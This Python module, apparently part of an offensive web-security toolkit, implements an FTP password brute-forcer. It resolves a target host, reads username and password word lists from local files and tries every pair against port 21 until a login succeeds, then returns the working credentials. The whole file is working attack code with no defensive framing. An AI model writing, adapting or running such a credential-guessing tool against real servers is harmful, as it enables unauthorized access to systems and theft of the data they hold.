#!/usr/bin/env python
#-*- coding: utf-8 -*-

from __future__ import print_function
import ftplib
import time
import socket
from time import sleep
from sys import exit
from concurrent.futures import ThreadPoolExecutor,as_completed
from ftplib import FTP

ftppass = []
ftpuser = []



def ftpBrute0x00(ip, usernames, passwords, port, delay):

    ftp = FTP()
    for username in usernames:
        for password in passwords:
            try:
                ftp.connect(ip, port)
                ftp.login(username, password)
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                sleep(delay)
                pass
            except ftplib.all_errors as e:
                pass
            except KeyboardInterrupt:
                ftp.quit()

def ftpbrute(web):

    time.sleep(0.6)
    with open('app/views/module/file/dict/brute/ftp/ftp_user.lst') as users:
        for user in users:
            user = user.strip('\n')
            ftpuser.append(user)
    with open('app/views/module/file/dict/brute/ftp/ftp_pass.lst') as passwd:
        for passw in passwd:
            passw = passw.strip('\n')
            ftppass.append(passw)

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    port = 21
    delay = 1
    username,password = ftpBrute0x00(ip, ftpuser, ftppass, port, delay)
    return username,password